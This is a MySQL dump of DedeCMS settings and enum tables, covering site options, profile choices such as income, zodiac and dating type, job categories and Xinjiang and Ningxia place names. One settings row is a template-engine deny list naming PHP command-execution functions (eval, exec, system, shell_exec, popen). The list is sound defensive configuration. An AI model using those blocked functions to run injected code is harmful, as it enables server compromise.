INSERT INTO dede_sysconfig VALUES ('741', 'cfg_userad_adds', '会员推广获积分', '5', 'number', '10');
INSERT INTO dede_sysconfig VALUES ('742', 'cfg_ddimg_full', '缩略图是否使用强制大小(对背景填充)', '3', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('743', 'cfg_ddimg_bgcolor', '缩略图空白背景填充颜色(0-白,1-黑)', '3', 'number', '0');
INSERT INTO dede_sysconfig VALUES ('744', 'cfg_replace_num', '文档内容同一关键词替换次数(0为全部替换)', '7', 'number', '2');
INSERT INTO dede_sysconfig VALUES ('745', 'cfg_uplitpic_cut', '上传缩略图后是否马上弹出裁剪框', '3', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('746', 'cfg_album_mark', '图集是否使用水印(小图也会受影响)', '3', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('747', 'cfg_mb_feedcheck', '会员动态是否需要审核', '4', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('748', 'cfg_mb_msgischeck', '会员状态是否需要审核', '4', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('749', 'cfg_mb_reginfo', '注册是否需要完成详细资料的填写', '4', 'bool', 'Y');
INSERT INTO dede_sysconfig VALUES ('750', 'cfg_remote_site', '是否启用远程站点', '2', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('751', 'cfg_title_site', '是否发布和编辑文档时远程发布(启用远程站点的前提下)', '2', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('752', 'cfg_mysql_type', '数据库类型（支持mysql和mysqli）', '2', 'string', 'mysql');
INSERT INTO dede_sysconfig VALUES ('753', 'cfg_sphinx_article', '是否启用文章全文检索功能（需配置sphinx服务器）', '7', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('754', 'cfg_sphinx_host', 'Sphinx服务器主机地址', '7', 'string', 'localhost');
INSERT INTO dede_sysconfig VALUES ('755', 'cfg_sphinx_port', 'Sphinx服务器端口号', '7', 'number', '9312');
INSERT INTO dede_sysconfig VALUES ('14', 'cfg_domain_cookie', '跨域共享cookie的域名(例如: .dedecms.com)', '2', 'string', '');
INSERT INTO dede_sysconfig VALUES ('756', 'cfg_memcache_enable', '是否启用memcache缓存，如果为否(N)，默认使用文件缓存', '6', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('757', 'cfg_memcache_mc_defa', '默认memcache缓存服务器地址', '6', 'string', 'memcache://127.0.0.1:11211/default127');
INSERT INTO dede_sysconfig VALUES ('758', 'cfg_memcache_mc_oth', '附加memcache缓存服务器地址', '6', 'string', '');
INSERT INTO dede_sysconfig VALUES ('759', 'cfg_cross_sectypeid', '支持交叉栏目显示副栏目内容', '7', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('760', 'cfg_digg_update', '顶踩缓存异步更新间隔（0为不缓存）', '6', 'number', '0');
INSERT INTO dede_sysconfig VALUES ('761', 'cfg_feedback_guest', '是否允许匿名评论', '5', 'bool', 'N');
INSERT INTO dede_sysconfig VALUES ('0', 'cfg_disable_funs', '模板引擎禁用PHP函数', '7', 'bstring', 'phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents');
INSERT INTO dede_sysconfig VALUES ('0', 'cfg_disable_tags', '模板引擎禁用标签', '7', 'bstring', 'php');

-- ----------------------------
-- Table structure for `dede_sys_enum`
-- ----------------------------
DROP TABLE IF EXISTS `dede_sys_enum`;
CREATE TABLE `dede_sys_enum` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `ename` char(30) NOT NULL DEFAULT '',
  `evalue` char(20) NOT NULL DEFAULT '0',
  `egroup` char(20) NOT NULL DEFAULT '',
  `disorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `issign` tinyint(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=20020 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_sys_enum
-- ----------------------------
INSERT INTO dede_sys_enum VALUES ('139', 'cms制作', '503', 'vocation', '503', '0');
INSERT INTO dede_sys_enum VALUES ('39', '租房', '1', 'house', '0', '1');
INSERT INTO dede_sys_enum VALUES ('40', '一房以上', '2', 'house', '0', '1');
INSERT INTO dede_sys_enum VALUES ('41', '两房以上', '3', 'house', '0', '1');
INSERT INTO dede_sys_enum VALUES ('42', '大户/别墅', '4', 'house', '0', '1');
INSERT INTO dede_sys_enum VALUES ('43', '低于1000元', '1', 'income', '0', '1');
INSERT INTO dede_sys_enum VALUES ('44', '1000元以上', '2', 'income', '0', '1');
INSERT INTO dede_sys_enum VALUES ('45', '2000元以上', '3', 'income', '0', '1');
INSERT INTO dede_sys_enum VALUES ('46', '4000元以上', '4', 'income', '0', '1');
INSERT INTO dede_sys_enum VALUES ('47', '8000元以上', '5', 'income', '0', '1');
INSERT INTO dede_sys_enum VALUES ('48', '15000以上', '6', 'income', '0', '1');
INSERT INTO dede_sys_enum VALUES ('49', '初中以上', '1', 'education', '0', '1');
INSERT INTO dede_sys_enum VALUES ('50', '高中/中专', '2', 'education', '0', '1');
INSERT INTO dede_sys_enum VALUES ('51', '大学专科', '3', 'education', '0', '1');
INSERT INTO dede_sys_enum VALUES ('52', '大学本科', '4', 'education', '0', '1');
INSERT INTO dede_sys_enum VALUES ('53', '硕士', '5', 'education', '0', '1');
INSERT INTO dede_sys_enum VALUES ('54', '博士以上', '6', 'education', '0', '1');
INSERT INTO dede_sys_enum VALUES ('55', '仅用于判断缓存是否存在', '0', 'system', '0', '1');
INSERT INTO dede_sys_enum VALUES ('56', '白羊座', '1', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('57', '金牛座', '2', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('58', '双子座', '3', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('59', '巨蟹座', '4', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('60', '狮子座', '5', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('61', '处女座', '6', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('62', '天枰座', '7', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('63', '天蝎座', '8', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('64', '射手座', '9', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('65', '摩羯座', '10', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('66', '水瓶座', '11', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('67', '双鱼座', '12', 'star', '0', '1');
INSERT INTO dede_sys_enum VALUES ('68', '不吸烟', '1', 'smoke', '0', '1');
INSERT INTO dede_sys_enum VALUES ('69', '偶尔吸一点', '2', 'smoke', '0', '1');
INSERT INTO dede_sys_enum VALUES ('70', '抽得很凶', '3', 'smoke', '0', '1');
INSERT INTO dede_sys_enum VALUES ('71', '不喝酒', '1', 'drink', '0', '1');
INSERT INTO dede_sys_enum VALUES ('72', '偶尔喝一点', '2', 'drink', '0', '1');
INSERT INTO dede_sys_enum VALUES ('73', '喝得很凶', '3', 'drink', '0', '1');
INSERT INTO dede_sys_enum VALUES ('74', 'A', '1', 'blood', '0', '1');
INSERT INTO dede_sys_enum VALUES ('75', 'B', '2', 'blood', '0', '1');
INSERT INTO dede_sys_enum VALUES ('76', 'AB', '3', 'blood', '0', '1');
INSERT INTO dede_sys_enum VALUES ('77', 'O', '4', 'blood', '0', '1');
INSERT INTO dede_sys_enum VALUES ('78', '未婚', '1', 'marital', '0', '1');
INSERT INTO dede_sys_enum VALUES ('79', '已婚', '2', 'marital', '0', '1');
INSERT INTO dede_sys_enum VALUES ('80', '离异', '3', 'marital', '0', '1');
INSERT INTO dede_sys_enum VALUES ('81', '丧偶', '4', 'marital', '0', '1');
INSERT INTO dede_sys_enum VALUES ('82', '匀称', '1', 'bodytype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('83', '苗条', '2', 'bodytype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('84', '健壮', '3', 'bodytype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('85', '略胖', '4', 'bodytype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('86', '丰满', '5', 'bodytype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('87', '瘦小', '6', 'bodytype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('88', '高瘦', '7', 'bodytype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('89', '网友', '1', 'datingtype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('90', '恋人', '2', 'datingtype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('91', '玩伴', '3', 'datingtype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('92', '共同兴趣', '4', 'datingtype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('93', '男性朋友', '5', 'datingtype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('94', '女性朋友', '6', 'datingtype', '0', '1');
INSERT INTO dede_sys_enum VALUES ('95', '50人以下', '1', 'cosize', '0', '1');
INSERT INTO dede_sys_enum VALUES ('96', '50-200人', '2', 'cosize', '0', '1');
INSERT INTO dede_sys_enum VALUES ('97', '200-500人', '3', 'cosize', '0', '1');
INSERT INTO dede_sys_enum VALUES ('98', '500-2000人', '4', 'cosize', '0', '1');
INSERT INTO dede_sys_enum VALUES ('99', '2000-5000人', '5', 'cosize', '0', '1');
INSERT INTO dede_sys_enum VALUES ('100', '5000人以上', '6', 'cosize', '0', '1');
INSERT INTO dede_sys_enum VALUES ('20019', '澳门特别行政区', '17500', 'nativeplace', '17500', '0');
INSERT INTO dede_sys_enum VALUES ('20018', '香港特别行政区', '17000', 'nativeplace', '17000', '0');
INSERT INTO dede_sys_enum VALUES ('20017', '台湾省', '16500', 'nativeplace', '16500', '0');
INSERT INTO dede_sys_enum VALUES ('20016', '图木舒克市', '16015.3', 'nativeplace', '16015', '2');
INSERT INTO dede_sys_enum VALUES ('20015', '阿拉尔市', '16015.2', 'nativeplace', '16015', '2');
INSERT INTO dede_sys_enum VALUES ('20014', '石河子市', '16015.1', 'nativeplace', '16015', '2');
INSERT INTO dede_sys_enum VALUES ('20013', '省直辖行政单位', '16015', 'nativeplace', '16015', '1');
INSERT INTO dede_sys_enum VALUES ('20012', '吉木乃县', '16014.7', 'nativeplace', '16015', '2');
INSERT INTO dede_sys_enum VALUES ('20011', '青河县', '16014.6', 'nativeplace', '16015', '2');
INSERT INTO dede_sys_enum VALUES ('111', '商品', '500', 'infotype', '500', '0');
INSERT INTO dede_sys_enum VALUES ('112', '租房', '1000', 'infotype', '1000', '0');
INSERT INTO dede_sys_enum VALUES ('113', '交友', '1500', 'infotype', '1500', '0');
INSERT INTO dede_sys_enum VALUES ('114', '招聘', '2000', 'infotype', '2000', '0');
INSERT INTO dede_sys_enum VALUES ('115', '求职', '2500', 'infotype', '2500', '0');
INSERT INTO dede_sys_enum VALUES ('116', '票务', '3000', 'infotype', '3000', '0');
INSERT INTO dede_sys_enum VALUES ('117', '服务', '3500', 'infotype', '3500', '0');
INSERT INTO dede_sys_enum VALUES ('118', '培训', '4000', 'infotype', '4000', '0');
INSERT INTO dede_sys_enum VALUES ('119', '出售', '501', 'infotype', '501', '1');
INSERT INTO dede_sys_enum VALUES ('121', '求购', '502', 'infotype', '502', '1');
INSERT INTO dede_sys_enum VALUES ('122', '交换', '503', 'infotype', '503', '1');
INSERT INTO dede_sys_enum VALUES ('123', '合作', '504', 'infotype', '504', '1');
INSERT INTO dede_sys_enum VALUES ('124', '出租', '1001', 'infotype', '1001', '1');
INSERT INTO dede_sys_enum VALUES ('125', '求租', '1002', 'infotype', '1002', '1');
INSERT INTO dede_sys_enum VALUES ('126', '合租', '1003', 'infotype', '1003', '1');
INSERT INTO dede_sys_enum VALUES ('127', '找帅哥', '1501', 'infotype', '1501', '1');
INSERT INTO dede_sys_enum VALUES ('128', '找美女', '1502', 'infotype', '1502', '1');
INSERT INTO dede_sys_enum VALUES ('129', '纯友谊', '1503', 'infotype', '1503', '1');
INSERT INTO dede_sys_enum VALUES ('130', '玩伴', '1504', 'infotype', '1504', '1');
INSERT INTO dede_sys_enum VALUES ('131', '互联网', '500', 'vocation', '500', '0');
INSERT INTO dede_sys_enum VALUES ('132', '网站制作', '501', 'vocation', '501', '0');
INSERT INTO dede_sys_enum VALUES ('133', '机械', '1000', 'vocation', '1000', '0');
INSERT INTO dede_sys_enum VALUES ('134', '农业机械', '1001', 'vocation', '1001', '1');
INSERT INTO dede_sys_enum VALUES ('135', '机床', '1002', 'vocation', '1002', '1');
INSERT INTO dede_sys_enum VALUES ('136', '纺织设备和器材', '1003', 'vocation', '1003', '1');
INSERT INTO dede_sys_enum VALUES ('137', '风机/排风设备', '1004', 'vocation', '1004', '1');
INSERT INTO dede_sys_enum VALUES ('138', '虚心', '502', 'vocation', '502', '0');
INSERT INTO dede_sys_enum VALUES ('140', '模板制作', '503.001', 'vocation', '503', '2');
INSERT INTO dede_sys_enum VALUES ('141', '模块开发', '503.002', 'vocation', '503', '2');
INSERT INTO dede_sys_enum VALUES ('142', '企业网站', '501.001', 'vocation', '501', '2');
INSERT INTO dede_sys_enum VALUES ('143', '门户开发', '501.002', 'vocation', '501', '2');
INSERT INTO dede_sys_enum VALUES ('144', '商业网站', '501.003', 'vocation', '501', '2');
INSERT INTO dede_sys_enum VALUES ('145', '个人博客', '501.004', 'vocation', '501', '2');
INSERT INTO dede_sys_enum VALUES ('166', '化工', '1500', 'vocation', '1500', '0');
INSERT INTO dede_sys_enum VALUES ('147', '松松散散', '502.001', 'vocation', '502', '2');
INSERT INTO dede_sys_enum VALUES ('148', '测试分类', '502.002', 'vocation', '502', '2');
INSERT INTO dede_sys_enum VALUES ('150', '塑料切割机', '1002.001', 'vocation', '1002', '2');
INSERT INTO dede_sys_enum VALUES ('151', '打磨机', '1002.002', 'vocation', '1002', '2');
INSERT INTO dede_sys_enum VALUES ('152', '水货机器', '1002.003', 'vocation', '1002', '2');
INSERT INTO dede_sys_enum VALUES ('153', '自动收割机', '1001.001', 'vocation', '1001', '2');
INSERT INTO dede_sys_enum VALUES ('154', '运输机', '1001.002', 'vocation', '1001', '2');
INSERT INTO dede_sys_enum VALUES ('159', '水货', '2501', 'infotype', '2501', '0');
INSERT INTO dede_sys_enum VALUES ('160', '水111', '2501.001', 'infotype', '2501', '2');
INSERT INTO dede_sys_enum VALUES ('161', '水222', '2501.002', 'infotype', '2501', '2');
INSERT INTO dede_sys_enum VALUES ('162', '有才', '2502', 'infotype', '2502', '0');
INSERT INTO dede_sys_enum VALUES ('163', '有才啊啊啊', '2502.001', 'infotype', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('167', '塑料化工', '1501', 'vocation', '1501', '0');
INSERT INTO dede_sys_enum VALUES ('168', '加工', '1501.001', 'vocation', '1501', '2');
INSERT INTO dede_sys_enum VALUES ('169', '生产', '1501.002', 'vocation', '1501', '2');
INSERT INTO dede_sys_enum VALUES ('170', '物流', '1501.003', 'vocation', '1501', '2');
INSERT INTO dede_sys_enum VALUES ('171', '挨踢工作者', '2000', 'vocation', '2000', '0');
INSERT INTO dede_sys_enum VALUES ('172', '程序员', '2001', 'vocation', '2001', '0');
INSERT INTO dede_sys_enum VALUES ('173', '美工设计', '2002', 'vocation', '2002', '0');
INSERT INTO dede_sys_enum VALUES ('174', '前端开发', '2003', 'vocation', '2003', '0');
INSERT INTO dede_sys_enum VALUES ('175', '配色', '2002.001', 'vocation', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('176', '美学设计', '2002.002', 'vocation', '2002', '2');
INSERT INTO dede_sys_enum VALUES ('178', 'ddddd', '502.003', 'vocation', '502', '2');
INSERT INTO dede_sys_enum VALUES ('179', '学习下', '502.004', 'vocation', '502', '2');
INSERT INTO dede_sys_enum VALUES ('20010', '哈巴河县', '16014.5', 'nativeplace', '16015', '2');
INSERT INTO dede_sys_enum VALUES ('20009', '福海县', '16014.4', 'nativeplace', '16014', '2');
INSERT INTO dede_sys_enum VALUES ('20008', '富蕴县', '16014.3', 'nativeplace', '16014', '2');
INSERT INTO dede_sys_enum VALUES ('20007', '布尔津县', '16014.2', 'nativeplace', '16014', '2');
INSERT INTO dede_sys_enum VALUES ('20006', '阿勒泰市', '16014.1', 'nativeplace', '16014', '2');
INSERT INTO dede_sys_enum VALUES ('20005', '阿勒泰地区', '16014', 'nativeplace', '16014', '1');
INSERT INTO dede_sys_enum VALUES ('20004', '和布克赛尔蒙古自治县', '16013.7', 'nativeplace', '16014', '2');
INSERT INTO dede_sys_enum VALUES ('20003', '裕民县', '16013.6', 'nativeplace', '16014', '2');
INSERT INTO dede_sys_enum VALUES ('20002', '托里县', '16013.5', 'nativeplace', '16014', '2');
INSERT INTO dede_sys_enum VALUES ('20001', '沙湾县', '16013.4', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('20000', '额敏县', '16013.3', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19999', '乌苏市', '16013.2', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19998', '塔城市', '16013.1', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19997', '塔城地区', '16013', 'nativeplace', '16013', '1');
INSERT INTO dede_sys_enum VALUES ('19996', '尼勒克县', '16012.10', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19995', '特克斯县', '16012.9', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19994', '昭苏县', '16012.8', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19993', '新源县', '16012.7', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19992', '巩留县', '16012.6', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19991', '霍城县', '16012.5', 'nativeplace', '16013', '2');
INSERT INTO dede_sys_enum VALUES ('19990', '察布查尔锡伯自治县', '16012.4', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19989', '伊宁县', '16012.3', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19988', '奎屯市', '16012.2', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19987', '伊宁市', '16012.1', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19986', '伊犁哈萨克自治州', '16012', 'nativeplace', '16012', '1');
INSERT INTO dede_sys_enum VALUES ('19985', '民丰县', '16011.8', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19984', '于田县', '16011.7', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19983', '策勒县', '16011.6', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19982', '洛浦县', '16011.5', 'nativeplace', '16012', '2');
INSERT INTO dede_sys_enum VALUES ('19981', '皮山县', '16011.4', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19980', '墨玉县', '16011.3', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19979', '和田县', '16011.2', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19978', '和田市', '16011.1', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19977', '和田地区', '16011', 'nativeplace', '16011', '1');
INSERT INTO dede_sys_enum VALUES ('19976', '塔什库尔干塔吉克自治县', '16010.12', 'nativeplace', '16010', '2');
INSERT INTO dede_sys_enum VALUES ('19975', '巴楚县', '16010.11', 'nativeplace', '16010', '2');
INSERT INTO dede_sys_enum VALUES ('19974', '伽师县', '16010.10', 'nativeplace', '16010', '2');
INSERT INTO dede_sys_enum VALUES ('19973', '岳普湖县', '16010.9', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19972', '麦盖提县', '16010.8', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19971', '叶城县', '16010.7', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19970', '莎车县', '16010.6', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19969', '泽普县', '16010.5', 'nativeplace', '16011', '2');
INSERT INTO dede_sys_enum VALUES ('19968', '英吉沙县', '16010.4', 'nativeplace', '16010', '2');
INSERT INTO dede_sys_enum VALUES ('19967', '疏勒县', '16010.3', 'nativeplace', '16010', '2');
INSERT INTO dede_sys_enum VALUES ('19966', '疏附县', '16010.2', 'nativeplace', '16010', '2');
INSERT INTO dede_sys_enum VALUES ('19965', '喀什市', '16010.1', 'nativeplace', '16010', '2');
INSERT INTO dede_sys_enum VALUES ('19964', '喀什地区', '16010', 'nativeplace', '16010', '1');
INSERT INTO dede_sys_enum VALUES ('19963', '乌恰县', '16009.4', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19962', '阿合奇县', '16009.3', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19961', '阿克陶县', '16009.2', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19960', '阿图什市', '16009.1', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19959', '克孜勒苏柯尔克孜自治州', '16009', 'nativeplace', '16009', '1');
INSERT INTO dede_sys_enum VALUES ('19958', '柯坪县', '16008.9', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19957', '阿瓦提县', '16008.8', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19956', '乌什县', '16008.7', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19955', '拜城县', '16008.6', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19954', '新和县', '16008.5', 'nativeplace', '16009', '2');
INSERT INTO dede_sys_enum VALUES ('19953', '沙雅县', '16008.4', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19952', '库车县', '16008.3', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19951', '温宿县', '16008.2', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19950', '阿克苏市', '16008.1', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19949', '阿克苏地区', '16008', 'nativeplace', '16008', '1');
INSERT INTO dede_sys_enum VALUES ('19948', '博湖县', '16007.9', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19947', '和硕县', '16007.8', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19946', '和静县', '16007.7', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19945', '焉耆回族自治县', '16007.6', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19944', '且末县', '16007.5', 'nativeplace', '16008', '2');
INSERT INTO dede_sys_enum VALUES ('19943', '若羌县', '16007.4', 'nativeplace', '16007', '2');
INSERT INTO dede_sys_enum VALUES ('19942', '尉犁县', '16007.3', 'nativeplace', '16007', '2');
INSERT INTO dede_sys_enum VALUES ('19941', '轮台县', '16007.2', 'nativeplace', '16007', '2');
INSERT INTO dede_sys_enum VALUES ('19940', '库尔勒市', '16007.1', 'nativeplace', '16007', '2');
INSERT INTO dede_sys_enum VALUES ('19939', '巴音郭楞蒙古自治州', '16007', 'nativeplace', '16007', '1');
INSERT INTO dede_sys_enum VALUES ('19938', '温泉县', '16006.3', 'nativeplace', '16006', '2');
INSERT INTO dede_sys_enum VALUES ('19937', '精河县', '16006.2', 'nativeplace', '16006', '2');
INSERT INTO dede_sys_enum VALUES ('19936', '博乐市', '16006.1', 'nativeplace', '16006', '2');
INSERT INTO dede_sys_enum VALUES ('19935', '博尔塔拉蒙古自治州', '16006', 'nativeplace', '16006', '1');
INSERT INTO dede_sys_enum VALUES ('19934', '木垒哈萨克自治县', '16005.8', 'nativeplace', '16006', '2');
INSERT INTO dede_sys_enum VALUES ('19933', '吉木萨尔县', '16005.7', 'nativeplace', '16006', '2');
INSERT INTO dede_sys_enum VALUES ('19932', '奇台县', '16005.6', 'nativeplace', '16006', '2');
INSERT INTO dede_sys_enum VALUES ('19931', '玛纳斯县', '16005.5', 'nativeplace', '16006', '2');
INSERT INTO dede_sys_enum VALUES ('19930', '呼图壁县', '16005.4', 'nativeplace', '16005', '2');
INSERT INTO dede_sys_enum VALUES ('19929', '米泉市', '16005.3', 'nativeplace', '16005', '2');
INSERT INTO dede_sys_enum VALUES ('19928', '阜康市', '16005.2', 'nativeplace', '16005', '2');
INSERT INTO dede_sys_enum VALUES ('19927', '昌吉市', '16005.1', 'nativeplace', '16005', '2');
INSERT INTO dede_sys_enum VALUES ('19926', '昌吉回族自治州', '16005', 'nativeplace', '16005', '1');
INSERT INTO dede_sys_enum VALUES ('19925', '伊吾县', '16004.3', 'nativeplace', '16004', '2');
INSERT INTO dede_sys_enum VALUES ('19924', '巴里坤哈萨克自治县', '16004.2', 'nativeplace', '16004', '2');
INSERT INTO dede_sys_enum VALUES ('19923', '哈密市', '16004.1', 'nativeplace', '16004', '2');
INSERT INTO dede_sys_enum VALUES ('19922', '哈密地区', '16004', 'nativeplace', '16004', '1');
INSERT INTO dede_sys_enum VALUES ('19921', '托克逊县', '16003.3', 'nativeplace', '16003', '2');
INSERT INTO dede_sys_enum VALUES ('19920', '鄯善县', '16003.2', 'nativeplace', '16003', '2');
INSERT INTO dede_sys_enum VALUES ('19919', '吐鲁番市', '16003.1', 'nativeplace', '16003', '2');
INSERT INTO dede_sys_enum VALUES ('19918', '吐鲁番地区', '16003', 'nativeplace', '16003', '1');
INSERT INTO dede_sys_enum VALUES ('19917', '乌尔禾区', '16002.4', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19916', '白碱滩区', '16002.3', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19915', '克拉玛依区', '16002.2', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19914', '独山子区', '16002.1', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19913', '克拉玛依市', '16002', 'nativeplace', '16002', '1');
INSERT INTO dede_sys_enum VALUES ('19912', '乌鲁木齐县', '16001.8', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19911', '东山区', '16001.7', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19910', '达坂城区', '16001.6', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19909', '头屯河区', '16001.5', 'nativeplace', '16002', '2');
INSERT INTO dede_sys_enum VALUES ('19908', '水磨沟区', '16001.4', 'nativeplace', '16001', '2');
INSERT INTO dede_sys_enum VALUES ('19907', '新市区', '16001.3', 'nativeplace', '16001', '2');
INSERT INTO dede_sys_enum VALUES ('19906', '沙依巴克区', '16001.2', 'nativeplace', '16001', '2');
INSERT INTO dede_sys_enum VALUES ('19905', '天山区', '16001.1', 'nativeplace', '16001', '2');
INSERT INTO dede_sys_enum VALUES ('19904', '乌鲁木齐市', '16001', 'nativeplace', '16001', '1');
INSERT INTO dede_sys_enum VALUES ('19903', '新疆维吾尔自治区', '16000', 'nativeplace', '16000', '0');
INSERT INTO dede_sys_enum VALUES ('19902', '海原县', '15505.3', 'nativeplace', '15505', '2');
INSERT INTO dede_sys_enum VALUES ('19901', '中宁县', '15505.2', 'nativeplace', '15505', '2');
INSERT INTO dede_sys_enum VALUES ('19900', '沙坡头区', '15505.1', 'nativeplace', '15505', '2');
INSERT INTO dede_sys_enum VALUES ('19899', '中卫市', '15505', 'nativeplace', '15505', '1');
INSERT INTO dede_sys_enum VALUES ('19898', '彭阳县', '15504.5', 'nativeplace', '15505', '2');
INSERT INTO dede_sys_enum VALUES ('19897', '泾源县', '15504.4', 'nativeplace', '15504', '2');
INSERT INTO dede_sys_enum VALUES ('19896', '隆德县', '15504.3', 'nativeplace', '15504', '2');
INSERT INTO dede_sys_enum VALUES ('19895', '西吉县', '15504.2', 'nativeplace', '15504', '2');
INSERT INTO dede_sys_enum VALUES ('19894', '原州区', '15504.1', 'nativeplace', '15504', '2');
INSERT INTO dede_sys_enum VALUES ('19893', '固原市', '15504', 'nativeplace', '15504', '1');
INSERT INTO dede_sys_enum VALUES ('19892', '青铜峡市', '15503.4', 'nativeplace', '15503', '2');
INSERT INTO dede_sys_enum VALUES ('19891', '同心县', '15503.3', 'nativeplace', '15503', '2');
INSERT INTO dede_sys_enum VALUES ('19890', '盐池县', '15503.2', 'nativeplace', '15503', '2');
INSERT INTO dede_sys_enum VALUES ('19889', '利通区', '15503.1', 'nativeplace', '15503', '2');
INSERT INTO dede_sys_enum VALUES ('19888', '吴忠市', '15503', 'nativeplace', '15503', '1');
INSERT INTO dede_sys_enum VALUES ('19887', '平罗县', '15502.3', 'nativeplace', '15502', '2');
INSERT INTO dede_sys_enum VALUES ('19886', '惠农区', '15502.2', 'nativeplace', '15502', '2');
INSERT INTO dede_sys_enum VALUES ('19885', '大武口区', '15502.1', 'nativeplace', '15502', '2');
INSERT INTO dede_sys_enum VALUES ('19884', '石嘴山市', '15502', 'nativeplace', '15502', '1');
INSERT INTO dede_sys_enum VALUES ('19883', '灵武市', '15501.6', 'nativeplace', '15502', '2');
INSERT INTO dede_sys_enum VALUES ('19882', '贺兰县', '15501.5', 'nativeplace', '15502', '2');
INSERT INTO dede_sys_enum VALUES ('19881', '永宁县', '15501.4', 'nativeplace', '15501', '2');
INSERT INTO dede_sys_enum VALUES ('19880', '金凤区', '15501.3', 'nativeplace', '15501', '2');
